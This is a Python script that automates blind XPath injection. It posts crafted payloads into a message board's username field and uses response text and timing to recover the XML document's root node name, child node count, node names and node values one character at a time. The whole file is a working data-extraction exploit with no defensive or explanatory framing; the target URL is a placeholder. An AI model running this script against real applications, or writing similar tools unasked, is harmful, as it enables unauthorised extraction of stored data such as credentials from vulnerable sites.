import requests
import time
import string

# URL of the web application
url = 'http://example.com/message_board'

# Customizable response time threshold
response_time_threshold = 1.0

# Function to test the XPath injection payload
def test_xpath_payload(payload, timeout=5):
    try:
        data = {'username': payload}
        start_time = time.time()
        response = requests.post(url, data=data, timeout=timeout)
        end_time = time.time()
        response_time = end_time - start_time
        return response.text, response_time
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return "", 0

# Function to determine the length of a node's name
def find_node_length(xpath_expression):
    length = 1
    while True:
        payload = f"invalid' or string-length({xpath_expression})={length} and '1'='1"
        response_text, response_time = test_xpath_payload(payload)
        if "Success" in response_text or response_time > response_time_threshold:
            return length
        length += 1

# Function to extract a node's name or value
def extract_node_name_or_value(xpath_expression, length):
    node_name_or_value = ''
    for position in range(1, length + 1):
        # Start with more likely characters first
        for char in 'u' + string.ascii_letters + string.digits:
            payload = f"invalid' or substring({xpath_expression},{position},1)='{char}' and '1'='1"
            response_text, response_time = test_xpath_payload(payload)
            if "Success" in response_text or response_time > response_time_threshold:
                node_name_or_value += char
                break
    return node_name_or_value

# Function to count child nodes of a given node
def count_child_nodes(parent_node):
    count = 1
    while True:
        payload = f"invalid' or count({parent_node}/*)={count} and '1'='1"
        response_text, response_time = test_xpath_payload(payload)
        if "Success" in response_text or response_time > response_time_threshold:
            count += 1
        else:
            return count - 1

# Function to extract child node names
def extract_child_node_names(parent_node, child_count):
    child_node_names = []
    for i in range(1, child_count + 1):
        xpath_expression = f"{parent_node}[{i}]"
        length = find_node_length(f"name({xpath_expression})")
        child_node_name = extract_node_name_or_value(f"name({xpath_expression})", length)
        child_node_names.append(child_node_name)
    return child_node_names

# Function to extract node values
def extract_node_values(parent_node, child_count):
    node_values = []
    for i in range(1, child_count + 1):
        xpath_expression = f"{parent_node}[{i}]"
        length = find_node_length(xpath_expression)
        node_value = extract_node_name_or_value(xpath_expression, length)
        node_values.append(node_value)
    return node_values

# Main function to find and print the root node's name and child nodes
def main():
    # Find and extract root node name
    root_node_length = find_node_length("name(/*[1])")
    print(f"Length of the root node's name: {root_node_length}")
    root_node_name = extract_node_name_or_value("name(/*[1])", root_node_length)
    print(f"Root node's name: {root_node_name}")

    # Explore child nodes
    parent_node = f"/{root_node_name}"
    child_count = count_child_nodes(parent_node)
    print(f"Number of child nodes: {child_count}")

    if child_count > 0:
        child_node_names = extract_child_node_names(parent_node, child_count)
        print("Child node names:")
        for name in child_node_names:
            print(f"  - {name}")

        # Extract values of child nodes
        child_node_values = extract_node_values(parent_node, child_count)
        print("Child node values:")
        for value in child_node_values:
            print(f"  - {value}")

if __name__ == "__main__":
    main()
